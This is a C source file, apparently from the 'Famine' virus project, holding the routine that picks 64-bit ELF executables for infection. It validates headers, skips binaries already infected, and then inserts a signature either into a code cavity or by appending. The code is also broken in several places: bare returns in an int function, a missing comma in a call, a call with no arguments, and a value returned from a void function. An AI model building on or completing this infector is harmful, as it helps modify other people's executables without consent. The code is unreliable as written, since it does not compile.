#include "famine.h"

#include <elf.h>
#include <stdint.h> // uintX_t
#include <string.h> // memcpy()

int infect_elf64(t_file *file)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;

	if (file->size < sizeof(Elf64_Ehdr))
		return ;

	ehdr = (Elf64_Ehdr *)file->map;

	if (ehdr->e_phnum == 0)
		return ;
	if (ehdr->e_phoff + (uint64_t)ehdr->e_phnum * sizeof(Elf64_Phdr) > file->size)
		return ;

	if (is_elf64_infected(file))
		return ;

	phdr = (Elf64_Phdr *)(file->map + ehdr->e_phoff);

	if (sign_elf64_cavity(file ehdr, phdr) == 0)
		return ;
	sign_elf64_append();
}

// void infect_elf32(t_file *file)
// {
// 	(void)file;
// }

void infect_elf(t_file *file)
{
	unsigned char *ident;

	ident = file->map;

	if (ident[EI_CLASS] == ELFCLASS64)
		return (infect_elf64(file));

	// if (ident[EI_CLASS] == ELFCLASS32)
	// 	return (infect_elf32(file));
}
